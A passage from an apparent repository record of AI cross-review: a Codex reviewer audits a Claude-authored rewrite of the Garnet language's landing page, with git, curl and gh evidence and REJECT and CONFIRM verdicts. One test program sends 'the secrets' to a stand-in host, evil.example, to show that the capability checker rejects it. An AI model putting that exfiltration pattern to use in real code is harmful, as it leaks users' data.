All other non-elided transcript content matched. Under the stated “anything else must be verbatim” rule, these whitespace substitutions are blocking.

5. Door field

Local href results:

/blog/feed.xml -> docs/blog/feed.xml -> EXISTS
blog/ -> docs/blog/index.html -> EXISTS
cra-article-14.html -> docs/cra-article-14.html -> EXISTS
getting-started.html -> docs/getting-started.html -> EXISTS
governance.html -> docs/governance.html -> EXISTS
icons/garnet-192.png -> docs/icons/garnet-192.png -> EXISTS
ladder.html -> docs/ladder.html -> EXISTS
logo-policy.html -> docs/logo-policy.html -> EXISTS
manifest.webmanifest -> docs/manifest.webmanifest -> EXISTS
minispec.html -> docs/minispec.html -> EXISTS
playground.html -> docs/playground.html -> EXISTS
status.html -> docs/status.html -> EXISTS
stdlib.html -> docs/stdlib.html -> EXISTS
why.html -> docs/why.html -> EXISTS

HTTPS href results using curl -s -o /dev/null -w '%{http_code}' -L:

https://garnet-lang.org/ -> 200
https://github.com/Island-Dev-Crew/garnet -> 200
https://github.com/Island-Dev-Crew/garnet/blob/main/F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md -> 200
https://github.com/Island-Dev-Crew/garnet/blob/main/LICENSE -> 200
https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md -> 200
https://github.com/Island-Dev-Crew/garnet/commit/fbd64bc514b573a6735b3525f4f3172be14a27d0 -> 200
https://github.com/Island-Dev-Crew/garnet/releases/tag/v0.8.1 -> 200
https://github.com/Island-Dev-Crew/garnet/rules/18936562 -> 200
https://github.com/Island-Dev-Crew/garnet/tree/main/F_Project_Management/W_TRUST -> 200
https://islanddevcrew.com -> 200

Playground:

$ ls -l docs/playground.html docs/playground/pkg/garnet_wasm_bg.wasm
-rw-r--r--@ 1 IDC2.5  wheel     7997 Sep  2 11:21 docs/playground.html
-rw-r--r--@ 1 IDC2.5  wheel  2217102 Sep  2 11:21 docs/playground/pkg/garnet_wasm_bg.wasm

$ rg -n 'check_source|run_source|diff_caps_source' docs/playground/live.js
2:  check_source,
3:  diff_caps_source,
4:  run_source,
77:  const result = parseAdapterJson(run_source(ui.source.value), RUN_SCHEMA);
93:  const result = parseAdapterJson(check_source(ui.source.value), CHECK_SCHEMA);
106:    diff_caps_source(ui.baseline.value, ui.source.value),

$ find docs -maxdepth 2 -type f \( -name '*shelf*' -o -name 'shelf.*' \) -print
(no output)

Result: all hrefs resolve; Playground is open with check/run/diff-caps; Shelf is locked and has no page.

6. Primitive count and release posture

$ git show HEAD:docs/truth.json | grep primitive_count
  "primitive_count": 80,

$ grep -n -i 'research-grade' CLAUDE.md
32:  `garnet-0.5.0-*` build. Still research-grade, not production/1.0.
35:- Garnet is a **research-grade prototype (v0.x.x), not production / 1.0.**

$ git tag --sort=-v:refname | head -1
v0.8.1

Result: both claims confirmed.

7. Static page and external requests

$ grep -nE 'https?://' docs/index.html
12:<link rel="canonical" href="https://garnet-lang.org/">
17:<meta property="og:url" content="https://garnet-lang.org/">
19:<meta property="og:image" content="https://garnet-lang.org/assets/garnet-og.png">
26:<meta name="twitter:image" content="https://garnet-lang.org/assets/garnet-og.png">
127:    <span><span class="k">main</span> <a href="https://github.com/Island-Dev-Crew/garnet/commit/fbd64bc514b573a6735b3525f4f3172be14a27d0"><b>fbd64bc5</b></a></span>
128:    <span><span class="k">release</span> <a href="https://github.com/Island-Dev-Crew/garnet/releases/tag/v0.8.1"><b>v0.8.1</b></a> <span class="k">signed · SBOM</span></span>
129:    <span><span class="k">ruleset 18936562</span> <a href="https://github.com/Island-Dev-Crew/garnet/rules/18936562"><b class="ok">bypass_actors []</b></a></span>
131:    <span><span class="k">WV-6</span> <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md"><b class="warn">partial</b></a> <span class="k">disclosed, U-58</span></span>
157:    <a class="door" href="https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md">Security<small>policy · disclosure</small></a>
161:    <a class="door" href="https://github.com/Island-Dev-Crew/garnet">GitHub<small>the record itself</small></a>
188:{"_type":"https://in-toto.io/Statement/v1","subject":[{"name":"hello","digest":{"blake3":"be28668b…bf8845c2"}}],"predicateType":"https://garnet-lang.org/attestation/seal/v1", … }
203:    <p>Trust-kernel changes carry all five. The register of what the gates caught is public: <a href="https://github.com/Island-Dev-Crew/garnet/tree/main/F_Project_Management/W_TRUST">findings U-04 through U-83</a>, historical gaps recorded.</p>
209:    <a class="builtby" href="https://islanddevcrew.com" aria-label="Built by Island Dev Crew">
225:    <span class="foot-meta">© 2026 Island Dev Crew · <a href="https://github.com/Island-Dev-Crew/garnet/blob/main/LICENSE">Apache-2.0 or MIT</a> · <a href="logo-policy.html">name &amp; logo policy</a></span>

$ rg -n '<(img|iframe)\b|<script[^>]+src=|@import|url\(' docs/index.html
(no output)
loaded_external_asset_ref_exit=1

Externally loaded font/script/image/iframe/CSS URLs: none.

Same-origin resources may be requested: manifest.webmanifest, icons/garnet-192.png, service-worker.js, and the service worker’s local cache inventory. These are not external-origin requests. The og:image and twitter:image values are metadata declarations, not ordinary page-load requests.

Result: “static · zero external requests” is supported when “external” means off-origin.

8. Retired vocabulary and capability audit

$ grep -inE '[retired word elided by the transporting seat]' docs/index.html
(no output)
retired_vocab_exit=1

Capability assertions:

1. Meta description: “checker rejects undeclared authority” — FAIL. This lacks the registered-surface qualification. U-83 records four memory natives that reach host authority but have no capability row.

2. Body tagline: checker rejects undeclared calls into its registered capability surface — PASS, reproduced by exfil.garnet.

3. Diffs report widened authority — PASS, reproduced with authority-expanded and exit 1.

4. Deterministic builds emit recomputable source_hash/ast_hash — PASS.

5. Seals emit an in-toto predicate and disclose missing cosign as UNSIGNED — PASS.

6. Playground runs/checks/diffs in-browser — PASS from the local WASM and adapter calls.

7. “80 registered primitives” — PASS.

8. “static · zero external requests” — PASS under the external-origin meaning described in item 7.

9. Acceptance process — independent cross-family review, exact-head record, separate approval/merge, content-change invalidation, and missing-record red are present in repository contracts. Item 4 no longer presents post-approval re-evaluation as an operative act.

“The paperwork writes itself” is promotional metaphor rather than a falsifiable product capability.

8b. Acceptance list and register sentence

Candidate item 4:

Carrier approval bound to the record's commit, then the merge — separate acts, one human gate.

AGENTS.md authority:

269	It permits one same-run, same-head **Re-run all jobs** only after attempt 1 emits
270	the canonical `approval_pending_only/[approval-absent]` eligibility receipt and
271	the designated reviewer approves the exact unchanged record-containing head.
272	The carrier is a distinct authenticated Actions-write identity and transports
273	only the rerun; it gains no review authority.
274	...
275	carrier exists and `r2_role_separation_v1` is executable and green, the
276	exception is contract law but is ineligible for activation.

Result: item 4 omits re-evaluation, as requested. “Carrier approval” must mean approval bound to the record-carrier commit; it cannot mean approval authority held by the Actions-write carrier.

The page reads:

findings U-04 through U-83, historical gaps recorded.

$ grep -n "U-04" F_Project_Management/W_TRUST/*REGISTER*
F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md:31:  U-04, U-07, U-08, U-12, U-15 through U-27 contiguously, U-29 through
F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md:464:- Out of scope, observed: several pre-arc ids (e.g. U-04, U-07, U-08, U-12)
F_Project_Management/W_TRUST/LANDING_ARC_2_REGISTER_SWEEP_2026-09-01.md:28:- result: the distinct id space runs U-04 through U-76 with the historical
F_Project_Management/W_TRUST/LANDING_ARC_REGISTER_SWEEP_2026-08-31.md:22:- result: the distinct id space runs U-04 through U-72 with the historical

The U-76 line is the pre-allocation sweep. The same final register then records:

42:| U-83 | Four memory natives are caps-invisible | enforcement scope; L6 packet; #537 review; #539 | L8 product (stdlib rows) | open |
194:## U-83 — Four memory natives are caps-invisible
308:- Candidates processed: 7 new allocations (U-77 through U-83), 0 backfills,

Result: the page’s endpoint/gaps sentence is supported after reconciling the register’s pre-allocation sweep with its seven subsequent allocations.

9. Accessibility and responsiveness

$ rg -n 'aria-label="Everything on this site"|aria-disabled="true"|tabindex="0"|focus-visible|prefers-reduced-motion|overflow-x:auto|@media\(max-width:560px\)|min-width:calc\(50%' docs/index.html
53:.strip a:hover,.strip a:focus-visible{border-bottom-color:var(--gold-soft);outline:none}
73:.door:hover,.door:focus-visible{border-color:var(--ruby);background:var(--panel2);outline:none}
74:.door:focus-visible{box-shadow:0 0 0 2px rgba(214,69,80,.45)}
90:.term pre{margin:0;padding:20px 22px;font:400 12.5px/1.75 var(--mono);color:#bfbcc9;overflow-x:auto;white-space:pre}
115:@media(max-width:560px){.mast{padding-top:60px}.doors{gap:9px}.door{min-width:calc(50% - 9px);padding:13px 10px}.accept li{grid-template-columns:28px 1fr}}
116:@media(prefers-reduced-motion:no-preference){
149:  <nav class="doors wrap" aria-label="Everything on this site">
162:    <span class="door locked" role="link" aria-disabled="true" tabindex="0"

Pass: nav label, locked-door semantics, keyboard focus, focus-visible styling, entrance-animation guard, pre overflow containment, and 320px door sizing.

Source caveats:

$ python3 [contrast calculation]
#6b6874 on #0a0a0f: 3.63:1
#6b6874 on #12121a: 3.42:1

The faint color is used for normal text as small as 9–12px and misses the 4.5:1 normal-text threshold. Also, html{scroll-behavior:smooth} is unconditional; the reduced-motion query guards entrance animation but not smooth scrolling.

10. Rolling trust gate and closing integrity

$ perl -e '$seconds = shift; alarm $seconds; exec @ARGV' 300 python3 -I scripts/garnet_trust_kernel_review_status.py --base fbd64bc514b573a6735b3525f4f3172be14a27d0 --head HEAD --format json
{
  "schema": "garnet.trust_kernel_review/v2",
  "ok": true,
  "discovery_ok": true,
  "discovery_source": "git",
  "base_commit": "fbd64bc514b573a6735b3525f4f3172be14a27d0",
  "head_commit": "2e5d617cebaf564260e13c26f2f000898c183945",
  "trust_kernel_touched": false,
  "touched_paths": [],
  "review_record_present": false,
  "review_record_path": null,
  "reviewer": null,
  "reviewer_id": null,
  "reviewer_login": null,
  "reviewed_head": null,
  "reviewed_tree": null,
  "content_digest": null,
  "changed_count": 2,
  "problems": [],
  "review_companion_present": false,
  "companion_paths": [],
  "review_trailer_present": false,
  "trust_kernel_prefixes": [
    "garnet-check-v0.3/src/",
    "garnet-interp-v0.3/src/",
    "garnet-vm/src/",
    "garnet-stdlib/src/",
    "garnet-wasm/src/",
    ".github/actions/",
    ".github/rulesets/",
    ".github/workflows/",
    "scripts/garnet_",
    "scripts/test_garnet_",
    "F_Project_Management/W_TRUST/landed/"
  ],
  "trust_kernel_files": [
    ".github/CODEOWNERS",
    "Cargo.lock",
    "garnet-cli/Cargo.toml",
    "garnet-cli/src/bound_source.rs",
    "garnet-cli/src/cmd/add.rs",
    "garnet-cli/src/cmd/mod.rs",
    "garnet-cli/src/cmd/run.rs",
    "garnet-cli/src/cmd/test.rs",
    "garnet-cli/src/cmd/eval.rs",
    "garnet-cli/src/cmd/doctest.rs",
    "garnet-cli/src/bin/garnet.rs",
    "garnet-cli/src/lib.rs",
    "scripts/garnet_launch_readiness_status.py",
    "scripts/garnet_caps_enforcement_status.py",
    "scripts/garnet_capability_scope_status.py",
    "scripts/garnet_bounded_enforcement_status.py",
    "scripts/garnet_red_team_status.py",
    "docs/why.html",
    "C_Language_Specification/GARNET_CAPABILITY_ENFORCEMENT_SCOPE.md",
    "F_Project_Management/W_TRUST/LANDED_REVIEW_MARKERS.json"
  ]
}
rolling_gate_exit=0

Closing state:

$ git rev-parse HEAD
2e5d617cebaf564260e13c26f2f000898c183945

$ git rev-parse HEAD^{tree}
bc5c4b80cc357e650df29f43c3f0b045794f2506

$ git status --porcelain=v1
(no output)

The original candidate worktree also remains clean at the same head.

VERDICT: REJECT — bound to 2e5d617cebaf564260e13c26f2f000898c183945

1. (blocking) docs/index.html:7 claims the checker “rejects undeclared authority” without the required registered-surface boundary. U-83 records four caps-invisible memory natives reaching host authority with no capability rows. The body’s qualified version is true; the metadata version is not.

2. (blocking) The replacement removes the required current MSRV surface. `PYTHONDONTWRITEBYTECODE=1 python3 -I scripts/garnet_msrv_status.py --gate` returns `garnet-msrv gate FAILED: docs/index.html is missing current MSRV marker(s): ['Rust 1.95+']`, `"ok": false`, exit 1.

3. (blocking) The replacement deletes every `<!-- truth:... -->` marker from docs/index.html, contrary to xtask/AGENTS.md’s stamped-public-surface contract. `cargo run -q -p xtask -- truth --check --skip-tests` nevertheless returns `truth --check: ok (6 fields vs machine truth, 4 stamped surfaces)` and exit 0, demonstrating that the hard-coded release/primitive facts can now drift without that gate detecting the removed markers.

4. (blocking) The <pre> transcript is not strictly verbatim outside its U+2026 elisions. The spaces surrounding the diff-caps and seal elision markers are absent from real JSON output; the strict literal comparator returns `literal_chunks_match=false`.

5. (non-blocking) `--faint:#6b6874` produces only 3.63:1 or 3.42:1 contrast on its backgrounds while being used for normal text as small as 9–12px.

6. (non-blocking) `scroll-behavior:smooth` remains active under reduced-motion preference; only the entrance animations are guarded.

VOID-ON-MOVE: this review binds 2e5d617cebaf564260e13c26f2f000898c183945 and is void the instant that head moves.

STOP.



```

## Reviewing seat output — v1 (verbatim; superseded, retained for lineage)

```text
Review boundary

Commands:
  git rev-parse HEAD
  git rev-parse HEAD^{tree}
  git status --porcelain=v1

Results:
  a3fae77a86060098aa9f186960adec24ce83d79e
  09a4b6e5dad8a43d8c751514912a17aee372eb62
  [no status output]

Author seat: Claude Fable 5.1
Reviewer seat: OpenAI Codex
A separate disposable clone was detached at the same SHA/tree; it was clean and both changed files were byte-identical to the supplied worktree.

1. Diff scope

Command:
  git diff --stat fbd64bc5..HEAD

Result:
   docs/index.html        | 1851 ++++++------------------------------------------
   docs/service-worker.js |    2 +-
   2 files changed, 209 insertions(+), 1644 deletions(-)

Command:
  git diff --name-status fbd64bc514b573a6735b3525f4f3172be14a27d0..HEAD

Result:
  M	docs/index.html
  M	docs/service-worker.js

Exactly two files changed.

2. Evidence strip

2a. Main commit

Commands:
  git fetch origin
  git merge-base --is-ancestor fbd64bc514b573a6735b3525f4f3172be14a27d0 origin/main
  git rev-parse origin/main

Results:
  merge-base exit: 0
  fbd64bc514b573a6735b3525f4f3172be14a27d0

Confirmed.

2b. Release assets

Command:
  gh release view v0.8.1 --repo Island-Dev-Crew/garnet --json assets -q '.assets[].name'

Result:
  garnet-0.7.0-lsp-mvp-darwin-arm64.vsix
  garnet-0.7.0-lsp-mvp-linux-x64.vsix
  garnet-0.8.1-1.x86_64.rpm
  garnet-0.8.1-aarch64-apple-darwin.tar.gz
  garnet-0.8.1-x86_64-apple-darwin.tar.gz
  garnet-sbom-cyclonedx.tgz
  garnet_0.8.1-1_amd64.deb
  SHA256SUMS
  SHA256SUMS.asc

Exit: 0. Both SHA256SUMS.asc and the CycloneDX SBOM asset exist.

2c. Ruleset

Command:
  gh api repos/Island-Dev-Crew/garnet/rulesets/18936562 --jq '{enforcement: .enforcement, bypass_actors: .bypass_actors, required_status_checks_count: ([.rules[] | select(.type == "required_status_checks") | .parameters.required_status_checks[]] | length)}'

Result:
  {"bypass_actors":[],"enforcement":"active","required_status_checks_count":31}

Command:
  curl -s -o /dev/null -w '%{http_code}\n' https://github.com/Island-Dev-Crew/garnet/rules/18936562

Result:
  200

Confirmed: active, bypass_actors [], 31 required contexts, public URL 200.

2d. WV-6 and U-58

The requested command does not match the reporter’s current interface.

Command:
  python3 -I scripts/garnet_wv_acceptance_status.py --format json

Result:
  usage: garnet_wv_acceptance_status.py [-h] [--root ROOT] --wv {WV-6,WV-7}
                                        [--gate]
  garnet_wv_acceptance_status.py: error: the following arguments are required: --wv
  exit: 2

Adding --wv still shows that --format is unsupported:
  garnet_wv_acceptance_status.py: error: unrecognized arguments: --format json
  exit: 2

Corrected command, bounded to 300 seconds:
  python3 -I scripts/garnet_wv_acceptance_status.py --wv WV-6

Result:
  {
    "artifact_count": 5,
    "contract_base_main_sha": "231aefa91985e5a0520c493c7f0fc3e54d74efc8",
    "evidence_destination": "proofs/windows/launch-verification/wv6-minimum-shelf/",
    "findings": [
      "product content digest mismatch (35c1b7ad980515dc28f4d6706e5e692e1c99701a2bf25e4eae73f7ddc5cc0489 != 6f2d5f0b2dff0bd800955e0a55b81f6d6f784d71240fe3c906e58a6a3ca8eec6)",
      "product path count mismatch (1652 != 1646)"
    ],
    "landed_main_sha": null,
    "ok": false,
    "passed_check_count": 5,
    "product_content_sha256": "6f2d5f0b2dff0bd800955e0a55b81f6d6f784d71240fe3c906e58a6a3ca8eec6",
    "required_check_count": 5,
    "reviewed_head_sha": "8426ca761c696c3556190be77cce3e340250b5c7",
    "reviewed_tree_sha": "601a368414762646ec9e5ad29b53736e20628474",
    "schema": "garnet.wv_acceptance_status/v2",
    "state": "partial",
    "wv": "WV-6"
  }
  exit: 0

Command:
  grep -n 'U-58' F_Project_Management/W_TRUST/AUGUST_2026_ARC_REGISTER_SWEEP_2026-08-27.md | head -3

Result:
  36:  not block allocation. U-58 and U-59 appear nowhere. **U-58 is the next free
  49:| U-58 | Acceptance squash-successor gap | #523 ceremony rail; Read 1 at `8659771` | L1 | open |
  71:## U-58 — Acceptance squash-successor gap

WV-6 “partial” and U-58’s squash-successor description are confirmed.

2e. Human merge gate

CODEOWNERS maps all content to @IslandDevCrew.

Command:
  sed -n '1,10p' F_Project_Management/W_TRUST/WV6_REACCEPTANCE_REGISTRATIONS_2026-08-10.md

Relevant result:
  - Merge authority: Jon (`IslandDevCrew`) only.

GOVERNANCE.md also says final decisions on merges are Jon Isaac’s and that final merge remains an explicit human action. The “one human gate: Jon Isaac” claim is confirmed.

3. Tagline claims

3i. Undeclared registered capability

/tmp/exfil.garnet:
  @caps()
  def main() {
    net::tcp_connect("evil.example:443", "the secrets")
    0
  }

Command:
  target/release/garnet check /tmp/exfil.garnet

Result:
  caps coverage: function `main` does not declare `net` but transitively calls `net::tcp_connect` which requires it

  1 functions checked, 1 boundary call sites, 1 diagnostics

Command:
  echo $?

Result:
  1

Confirmed.

3ii. Widened authority

Command:
  target/release/garnet diff-caps --machine /tmp/hello.garnet /tmp/declared.garnet

Result:
  {"schema":"garnet.diff-caps.machine/1","verdict":"authority-expanded","authority_expanded":true,"capability_band":"2/5","exit_code":1,"aggregate_gained":["net"],"aggregate_removed":[],"wildcard_introduced":false,"functions_added":[],"functions_removed":[],"functions_caps_expanded":[{"name":"main","gained":["net"]}],"scope":"declared-surface-only; does not prove absence of undeclared authority; bound annotations are not part of this surface"}

Command:
  echo $?

Result:
  1

Confirmed.

3iii. Deterministic build and seal

Command:
  target/release/garnet build --deterministic /tmp/hello.garnet

Result:
  built /tmp/hello.garnet (1 items)
    source_hash = 54d0bdbe6b8efc4a6b3872da76a708366aa8c68eeff5a3038c98fe871feadd57
    ast_hash    = be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2
    manifest    = /tmp/hello.garnet.manifest.json

Exit: 0.

Command:
  target/release/garnet seal /tmp/hello.garnet

Verbatim predicate field:
  "predicateType":"https://garnet-lang.org/attestation/seal/v1"

Verbatim stderr:
  garnet seal: cosign not installed — in-toto predicate emitted UNSIGNED (wrap-don't-rebuild: install cosign to attest; Garnet does not sign supply-chain itself)

Exit: 0. The page’s digest abbreviation `be28668b…bf8845c2`, predicateType, and UNSIGNED note match.

4. Capture block

I extracted the rendered text of the page’s <pre>, reproduced the transcript in an isolated empty working directory, and treated each marked `…` span as the only permitted wildcard.

Result:
  ellipsis-aware full transcript match: True
  check exit: 1
  diff-caps exit: 1
  seal exit: 0
  check stderr: ''
  diff-caps stderr: ''
  seal digest: be28668b362fbb3c3f42d338166723305005a8d75a8f6274f821c666bf8845c2

Lines 1–14, 16–17, and 19 match exactly. Lines 15 and 18 match outside their explicitly marked elisions. No capture mismatch.

5. Door field

Local results:
  why.html                 True
  minispec.html            True
  getting-started.html     True
  playground.html          True
  status.html              True
  governance.html          True
  cra-article-14.html      True
  stdlib.html              True
  ladder.html              True
  blog/index.html          True
  blog/feed.xml            True
  logo-policy.html         True

HTTPS door results:
  200  https://github.com/Island-Dev-Crew/garnet/blob/main/SECURITY.md
  200  https://github.com/Island-Dev-Crew/garnet

All other HTTPS hrefs on the page also returned 200 after redirects.

Commands:
  ls -l docs/playground.html docs/playground/pkg/garnet_wasm_bg.wasm
  rg -n 'check_source|run_source|diff_caps_source' docs/playground/live.js

Results:
  docs/playground.html exists
  docs/playground/pkg/garnet_wasm_bg.wasm exists
  2:  check_source,
  3:  diff_caps_source,
  4:  run_source,
  77:  const result = parseAdapterJson(run_source(ui.source.value), RUN_SCHEMA);
  93:  const result = parseAdapterJson(check_source(ui.source.value), CHECK_SCHEMA);
  106:    diff_caps_source(ui.baseline.value, ui.source.value),

Command:
  find docs -maxdepth 2 -iname '*shelf*' -print

Result:
  [no output]

Playground is open; Shelf is locked.

6. Primitive count and release grade

Command:
  git show HEAD:docs/truth.json | grep primitive_count

Result:
    "primitive_count": 80,

Command:
  grep -n -i 'research-grade' CLAUDE.md

Result:
  32:  `garnet-0.5.0-*` build. Still research-grade, not production/1.0.
  35:- Garnet is a **research-grade prototype (v0.x.x), not production / 1.0.**

Command:
  git tag --sort=-v:refname | head -1

Result:
  v0.8.1

Confirmed.

7. Static page and external requests

Command:
  grep -nE 'https?://' docs/index.html

Result: HTTPS occurrences are canonical/metadata declarations, evidence links, navigation links, transcript text, and footer links. No remote URL appears in a stylesheet import, font URL, script src, image src, or iframe src.

Command:
  rg -n '(<script[^>]+src=|<img[^>]+src=|<iframe[^>]+src=|@import|url\()' docs/index.html

Result:
  [no output]

Cross-origin loaded fonts: none.
Cross-origin loaded scripts: none.
Cross-origin loaded images: none.
Cross-origin iframes: none.

Same-origin PWA resources are declared:
  manifest.webmanifest
  icons/garnet-192.png
  service-worker.js

The service worker’s same-origin offline assets all exist. The og:image and twitter:image values are metadata declarations; the asset itself returned HTTP 200. “Zero external requests” is true when “external” means cross-origin/third-party requests.

8. Retired vocabulary and present-tense audit

Command:
  grep -inE '[retired word elided by the transporting seat]' docs/index.html

Result:
  [no output]
  exit: 1

Capability/factual assertions:

  1. “Garnet lang is how anyone else can trust what it did.”
     Editorial thesis, immediately scoped by the registered-surface and unsigned-seal disclosures.

  2. “Checker rejects an undeclared call into its registered capability surface.”
     EXISTS. Reproduced with caps-coverage diagnostic and exit 1.

  3. “Diffs report widened authority.”
     EXISTS. Reproduced as authority-expanded with exit 1.

  4. “Builds and seals a stranger can recompute.”
     EXISTS within the stated scope. Deterministic build emitted source_hash/ast_hash; seal emitted the in-toto statement and explicitly disclosed that it was UNSIGNED.

  5. “Playground runs in your browser” and offers check/run/diff-caps.
     EXISTS. HTML, WASM, and all three imported browser functions exist.

  6. Status, Governance, Security, Stdlib, Paper VII, Blog, and GitHub doors describe existing surfaces.
     EXISTS. All local targets exist; remote targets return 200; primitive count is 80.

  7. “One door is locked … it opens when its evidence exists.”
     CURRENT LOCK STATE EXISTS. No Shelf page exists; the future opening condition is stated as policy.

  8. “The paperwork writes itself out of evidence that already exists.”
     EXISTS as rhetorical shorthand for the emitted build manifest, diff-caps JSON, and in-toto seal.

  9. Implementation on a branch, independent cross-family review, an exact-head structured record, and content-change/record-red rules.
     EXIST as repository procedure for trust-kernel changes.

  10. “Carrier approval and a single re-evaluation of the gate” and “Trust-kernel changes carry all five.”
      DOES NOT EXIST as an operative current acceptance route. AGENTS.md says the U-59 re-run exception is contract law but ineligible for activation until the distinct carrier exists and r2_role_separation_v1 is executable and green. The companion is explicitly OPEN-UNTIL-IMPLEMENTED.

  11. “The register … findings U-1 … U-83.”
      DOES NOT MATCH the register’s own current history. The register says its distinct ID space begins at U-04 and contains historical gaps; U-1 has no finding heading.

  12. “This page: static · zero external requests.”
      EXISTS as a static, zero-cross-origin-subresource implementation. Same-origin manifest/icon/service-worker requests remain.

9. Accessibility and responsiveness

Source evidence:
  nav aria-label:
    <nav class="doors wrap" aria-label="Everything on this site">

  locked door:
    role="link" aria-disabled="true" tabindex="0"

  focus:
    .door:focus-visible
    .strip a:focus-visible

  reduced motion:
    @media(prefers-reduced-motion:no-preference)

  transcript overflow:
    overflow-x:auto

  narrow layout:
    @media(max-width:560px)
    .door{min-width:calc(50% - 9px);padding:13px 10px}

The 1040/880/760 values are max-width constraints, not fixed viewport widths. The facet uses width:min(420px,70%), the wordmark uses clamp(), and the terminal transcript scrolls horizontally. No source-level 320 px overflow blocker found.

10. Rolling trust gate

Command, bounded to 300 seconds:
  python3 -I scripts/garnet_trust_kernel_review_status.py --base fbd64bc514b573a6735b3525f4f3172be14a27d0 --head HEAD --format json

Relevant verbatim result:
  {
    "schema": "garnet.trust_kernel_review/v2",
    "ok": true,
    "discovery_ok": true,
    "discovery_source": "git",
    "base_commit": "fbd64bc514b573a6735b3525f4f3172be14a27d0",
    "head_commit": "a3fae77a86060098aa9f186960adec24ce83d79e",
    "trust_kernel_touched": false,
    "touched_paths": [],
    "review_record_present": false,
    "changed_count": 2,
    "problems": []
  }

Exit: 0. Confirmed.

VERDICT: REJECT — bound to a3fae77a86060098aa9f186960adec24ce83d79e

1. BLOCKING — docs/index.html presents the single post-approval re-evaluation as an operative present-tense acceptance act. AGENTS.md states that U-59 is ineligible for activation until a distinct authenticated carrier exists and r2_role_separation_v1 is executable and green; U66_COMPANION_U59_EXCEPTION_2026-09-01.md labels it OPEN-UNTIL-IMPLEMENTED and says prose cannot grant eligibility.

2. BLOCKING — “findings U-1 … U-83” overstates the public register. Recomputed evidence:
   22:- result: the distinct id space runs U-04 through U-72 with the historical
   42:| U-83 | Four memory natives are caps-invisible | enforcement scope; L6 packet; #537 review; #539 | L8 product (stdlib rows) | open |
   U-1 heading count: 0
   U-83 heading count: 1
   The copy must acknowledge the U-04 starting point and historical gaps, or avoid implying a continuous U-1-through-U-83 register.

3. NON-BLOCKING — The requested WV reporter command is stale relative to this SHA: --wv WV-6 is mandatory and --format json is unsupported. The corrected command exits 0 and confirms state “partial,” so this does not invalidate the page’s WV-6 value.

STOP.



```

## Lineage continued (records-class, 2026-09-02)

- PR #545's first firing on the rebased content `29651b67…` went red on two required checks the replacement had dropped surfaces for: `scripts/garnet_positioning_status.py` (landing themes "the integration, not the parts", "well-precedented", "agent-authored code") and the dogfood matrix's promo-video probes (`scripts/garnet_promo_video_status.py`: the public-site embed tokens and the source-lock phrase "Objective accounting"). Both were carried on the June page. Content v4 `427d51af…` restored them; Codex v4 → **REJECT** (three blocking: a stale scope line in the review prompt; the checker's episodic-cache notes when run where a `.garnet-cache` exists, so the capture's fresh-directory condition had to be stated; the promo caption's "manifest-backed" wording, since the current manifests bind 60-second files and the embedded 30-second files are not hash-bound — registered as U-90). Content v5 `b36f613ec2dc11f8afb0ea97bf06b6a006b97ed7` cured the two page findings and the prompt was corrected; Codex v5 → **CONFIRM**, no findings. CI on `b36f613e…` is green apart from the optional Base-controlled composite (U-82 shape).
- Verdict of record: **CONFIRM**, bound to `b36f613e…`; 2 retired-word occurrence(s) in the reviewing seat's prose elided and marked below. This record commit is the records-class head move it anticipates.

## Reviewing seat output — v5 (verbatim, elisions marked)

```text
1. Scope and review identity

Author seat: Claude  
Reviewer seat: OpenAI Codex  
Base: f77a3ebd6d5890d0d46eb71633446b7275995956  
Reviewed head: b36f613ec2dc11f8afb0ea97bf06b6a006b97ed7

Commands and results:

    $ git rev-parse HEAD
    b36f613ec2dc11f8afb0ea97bf06b6a006b97ed7

    $ git status --porcelain=v1
    (no output)

    $ git diff --stat f77a3ebd6d5890d0d46eb71633446b7275995956..HEAD
     .../W_TRUST/FRONT_DOOR_REVIEW_2026-09-02.md | 1490 ++++++++++++++++
     docs/index.html                              | 1869 +++-----------------
     docs/service-worker.js                       |    2 +-
     3 files changed, 1718 insertions(+), 1643 deletions(-)

    $ git diff --name-status f77a3ebd6d5890d0d46eb71633446b7275995956..HEAD
    A	F_Project_Management/W_TRUST/FRONT_DOOR_REVIEW_2026-09-02.md
    M	docs/index.html
    M	docs/service-worker.js

    $ git log --format='%H %s' f77a3ebd6d5890d0d46eb71633446b7275995956..HEAD
    b36f613ec2dc11f8afb0ea97bf06b6a006b97ed7 site(front-door): name the capture's fresh-directory condition; bound the promo caption to what the manifests bind
    427d51aff4b2bf7f0d5092cbb3739bc2442e0a73 site(front-door): carry the positioning themes and the promo embed the gates require
    0d45e43e04873569347b34483cad640a8b11dda8 records(front-door): Codex confirmation record, three lineages (CONFIRM bound to 36040564; rebased content byte-identical)
    29651b6706b3cd100778744ee41783edefff423b site(front-door): replace the June index with the evidence front door

    $ git rev-list --count f77a3ebd6d5890d0d46eb71633446b7275995956..HEAD
    4

Fresh-clone independence check:

    $ git clone --filter=blob:none --no-checkout https://github.com/Island-Dev-Crew/garnet.git /tmp/garnet-codex-review.8thp9R/reviewer
    $ git -C /tmp/garnet-codex-review.8thp9R/reviewer checkout --detach b36f613ec2dc11f8afb0ea97bf06b6a006b97ed7
    HEAD is now at b36f613 site(front-door): name the capture's fresh-directory condition; bound the promo caption to what the manifests bind

    $ git -C /tmp/garnet-codex-review.8thp9R/reviewer rev-parse HEAD
    b36f613ec2dc11f8afb0ea97bf06b6a006b97ed7

    $ git -C /tmp/garnet-codex-review.8thp9R/reviewer status --porcelain=v1
    (no output)

Result: PASS. Exactly three files and four commits; both supplied and independent checkouts are clean and exact-tip bound.

2. Evidence strip

2a. Main ancestry

    $ git fetch origin
    $ git merge-base --is-ancestor f77a3ebd6d5890d0d46eb71633446b7275995956 origin/main
    base_ancestor_exit=0

    $ git merge-base --is-ancestor fbd64bc514b573a6735b3525f4f3172be14a27d0 origin/main
    strip_main_ancestor_exit=0

    $ git rev-parse origin/main
    f77a3ebd6d5890d0d46eb71633446b7275995956

    $ git log -1 --format='%H %s' fbd64bc514b573a6735b3525f4f3172be14a27d0
